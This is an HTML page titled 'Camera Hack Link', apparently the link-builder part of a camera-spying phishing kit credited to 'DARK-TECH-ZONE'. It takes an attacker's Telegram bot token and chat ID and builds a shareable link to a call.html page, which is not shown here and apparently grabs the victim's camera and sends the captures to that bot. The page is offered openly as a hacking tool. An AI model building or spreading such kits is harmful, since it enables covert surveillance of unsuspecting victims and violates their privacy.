<!DOCTYPE html>
<html>
<head>
  <title>Camera Hack Link</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; background: #e6ffe6; padding: 20px; text-align: center; }
    input, button { padding: 10px; margin: 10px 0; width: 100%; max-width: 400px; display: block; margin-left: auto; margin-right: auto; }
    .red-bar { position: absolute; top: 0; left: 0; width: 5px; height: 100vh; background: red; }
    #linkBox { margin-top: 10px; background: #fff; padding: 10px; border: 1px solid #ccc; }
    .footer-btn { background-color: #25d366; color: white; font-weight: bold; border: none; border-radius: 5px; padding: 10px; width: 90%; max-width: 400px; margin-top: 20px; }
    .footer-credit { margin-top: 10px; color: #333; font-weight: bold; }
  </style>
</head>
<body>
  <div class="red-bar"></div>
  <h2>Enter Telegram Bot Info</h2>
  <input type="text" id="botToken" placeholder="Telegram Bot Token">
  <input type="text" id="chatId" placeholder="Chat ID">
  <button onclick="generateLink()">Generate Share Link</button>
  <div id="linkBox" style="display:none;">
    <strong>Copy & Share:</strong>
    <input type="text" id="generatedLink" readonly style="width:100%; margin-top:5px;">
    <button onclick="copyLink()">ðŸ“‹ Copy Link</button>
  </div>

  <a href="https://whatsapp.com/channel/0029VbBXISPDuMRjYCb7Xl0X" target="_blank">
    <button class="footer-btn">Join My WhatsApp Channel</button>
  </a>
  <div class="footer-credit">DEVELOPED BY HASSNAIN ALI OWNER OF DARK-TECH-ZONE</div>

  <script>
    function generateLink() {
      const botToken = encodeURIComponent(document.getElementById('botToken').value.trim());
      const chatId = encodeURIComponent(document.getElementById('chatId').value.trim());
      if (!botToken || !chatId) return alert('Both fields are required!');

      const link = `${location.origin}/call.html?token=${botToken}&chat=${chatId}`;
      document.getElementById('generatedLink').value = link;
      document.getElementById('linkBox').style.display = 'block';
    }

    function copyLink() {
      const linkInput = document.getElementById('generatedLink');
      linkInput.select();
      document.execCommand('copy');
      alert('Link copied!');
    }
  </script>
</body>
</html>
